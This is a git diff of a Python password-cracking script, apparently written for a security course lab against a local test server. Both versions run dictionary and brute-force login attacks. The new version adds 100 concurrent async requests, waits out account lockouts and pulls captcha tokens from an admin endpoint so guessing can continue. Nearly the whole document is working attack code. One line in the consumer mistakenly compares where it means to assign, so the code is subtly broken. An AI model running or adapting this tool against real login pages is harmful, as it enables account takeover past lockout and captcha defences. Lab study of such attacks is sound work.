@@ -1,80 +1,129 @@
 import itertools
 import string
-import time
-import requests
+from time import time
+import asyncio
+import aiohttp
 from bs4 import BeautifulSoup
 
 GROUP_SEED = '496905569'
-URL = 'http://localhost:5000'
-SECONDS_PER_HOUR = 3600
-TOTAL_HOURS = 2
+TARGET_URL = 'http://localhost:5000'
+CONCURRENT_REQUESTS = 100
 
-def dictionary_attack(users, wordlist_filepath):
-    session = requests.Session()
+lock = asyncio.Lock()
+cracked = {}
+attempts_count = 0
+queue = None
+
+def dictionary_attack(users, wordlist_filepath, max_attempts, max_duration_min):
+    producer_args = {
+        'filepath' : wordlist_filepath
+    }
+    return asyncio.run(_attack(users, max_attempts, max_duration_min, producer_args))
+
+def bruteforce_attack(users, digit, lowercase, uppercase, special, max_password_length, max_attempts, max_duration_min):
+    charset = ""
+    charset = charset + string.digits if digit else charset
+    charset = charset + string.ascii_lowercase if lowercase else charset
+    charset = charset + string.ascii_uppercase if uppercase else charset
+    charset = charset + string.punctuation if special else charset
+    producer_args = {
+        'charset' : charset,
+        'max_length' : max_password_length
+    }
+    return asyncio.run(_attack(users, max_attempts, max_duration_min, producer_args))
+
+def stop_attack():
+    global queue
+    if queue is not None:
+        queue.shutdown(immediate=True)
+        queue = None
+    return cracked
+
+async def _attack(users, max_attempts, max_duration_min, producer_args):
+    global cracked, attempts_count, queue
     cracked = {}
-    captcha_required = False
-    with open(wordlist_filepath, 'r') as wordlist:
-        start = time.time()
+    attempts_count = 0
+    queue = asyncio.Queue(maxsize=CONCURRENT_REQUESTS*10)
+    start = time()
+    total_users = len(users)
+    async with aiohttp.ClientSession() as session:
+        producer = asyncio.create_task(_producer(queue, users, **producer_args))
+        consumers = [asyncio.create_task(_consumer(session, queue, total_users, start, max_attempts, max_duration_min)) for _ in range(CONCURRENT_REQUESTS)]
+        await producer
+        await asyncio.gather(*consumers)
+        await queue.join()
+    return cracked
+
+def _producer(queue, users, filepath=None, charset=None, max_length=0):
+    if filepath is not None:
+        return _producer_dict(queue, users, filepath)
+    elif charset is not None and max_length > 0:
+        return _producer_bf(queue, users, charset, max_length)
+
+async def _producer_dict(queue, users, filepath):
+    with open(filepath, 'r') as wordlist:
         for line in wordlist:
             password = line.strip()
             for username in users:
-                if username not in cracked:
-                    result, captcha_required = _try_password(session, username, password, captcha_required)
-                    if result is None:
-                        cracked[username] = None
-                        if len(cracked) == len(users):
-                            return cracked
-                    elif result:
-                        cracked[username] = password
-                        if len(cracked) == len(users):
-                            return cracked
-                    elif time.time() - start > SECONDS_PER_HOUR * TOTAL_HOURS:
-                        return cracked
-    return cracked
+                try:
+                    await queue.put([username, password])
+                except asyncio.QueueShutDown:
+                    return
+    await queue.put(None)
 
-def bruteforce_attack(users, digit, lowercase, uppercase, special, max_password_length):
-    chars = ""
-    chars = chars + string.digits if digit else chars
-    chars = chars + string.ascii_lowercase if lowercase else chars
-    chars = chars + string.ascii_uppercase if uppercase else chars
-    chars = chars + string.punctuation if special else chars
-    session = requests.Session()
-    cracked = {}
-    captcha_required = False
-    start = time.time()
-    for length in range(1, max_password_length + 1):
-        for password in _gen_passwords(chars, length):
+async def _producer_bf(queue, users, charset, max_length):
+    for length in range(1, max_length+1):
+        for combination in itertools.product(charset, repeat=length):
+            password = ''.join(combination)
             for username in users:
-                if username not in cracked:
-                    result, captcha_required = _try_password(session, username, password, captcha_required)
-                    if result is None:
-                        cracked[username] = None
-                        if len(cracked) == len(users):
-                            return cracked
-                    elif result:
-                        cracked[username] = password
-                        if len(cracked) == len(users):
-                            return cracked
-                    elif time.time() - start > SECONDS_PER_HOUR * TOTAL_HOURS:
-                        return cracked
-    return cracked
+                try:
+                    await queue.put([username, password])
+                except asyncio.QueueShutDown:
+                    return
+    await queue.put(None)
 
-def _gen_passwords(chars, length):
-    for attempt in itertools.product(chars, repeat=length):
-        yield ''.join(attempt)
+async def _consumer(session, queue, total_users, start, max_attempts, max_duration_min):
+    while True:
+        try:
+            item = await queue.get()
+        except asyncio.QueueShutDown:
+            break
+        if item is None:
+            queue.task_done()
+            queue.shutdown(immediate=False)
+            break
+        username, password = item
+        result = await _attempt_login(session, username, password)
+        global cracked, attempts_count
+        async with lock:
+            if result is None and username not in cracked: cracked[username] == None
+            elif result: cracked[username] = password
+            attempts_count += 1
+            queue.task_done()
+            if len(cracked) == total_users or attempts_count > max_attempts or time() - start > max_duration_min * 60:
+                queue.shutdown(immediate=True)
+                break
 
-def _try_password(session, username, password, captcha_required):
+async def _attempt_login(session, username, password, token_required=False):
     payload = {'username': username, 'password': password}
-    if captcha_required:
-        payload['captcha'] = _get_captcha_token(session)
-    response = session.post(URL + '/login_void', data=payload)
-    soup = BeautifulSoup(response.content, 'html.parser')
-    captcha_required = soup.find(id="captcha") is not None
-    msg = soup.find(id="msg").get_text().strip()
-    if msg.startswith("locked for"):
-        time.sleep(60)
-        return _try_password(session, username, password, captcha_required)
-    return None if msg == "locked" or msg == "OTP required" else msg == "logged in", captcha_required
-
-def _get_captcha_token(session):
-    return session.get(URL + '/admin/get_captcha_token?group_seed=' + GROUP_SEED).text
+    if token_required:
+        payload['captcha'] = await _get_captcha_token(session)
+    async with session.post(TARGET_URL + '/login', data=payload) as response:
+        html = await response.text()
+        soup = BeautifulSoup(html, 'html.parser')
+        msg = soup.find(id="msg").get_text().strip()
+        if msg.startswith("locked for"):
+            await asyncio.sleep(60)
+            return await _attempt_login(session, username, password)
+        if msg == "wrong token":
+            return await _attempt_login(session, username, password, token_required=True)
+        if msg == "locked" or msg == "wrong OTP":
+            return None
+        return msg == "logged in"
+    
+async def _get_captcha_token(session):
+    async with session.get(TARGET_URL + '/admin/get_captcha_token?group_seed=' + GROUP_SEED) as response:
+        html = await response.text()
+        soup = BeautifulSoup(html, 'html.parser')
+        token = soup.find(id="msg").get_text().strip()[7:]
+        return token if token != "not found" else None
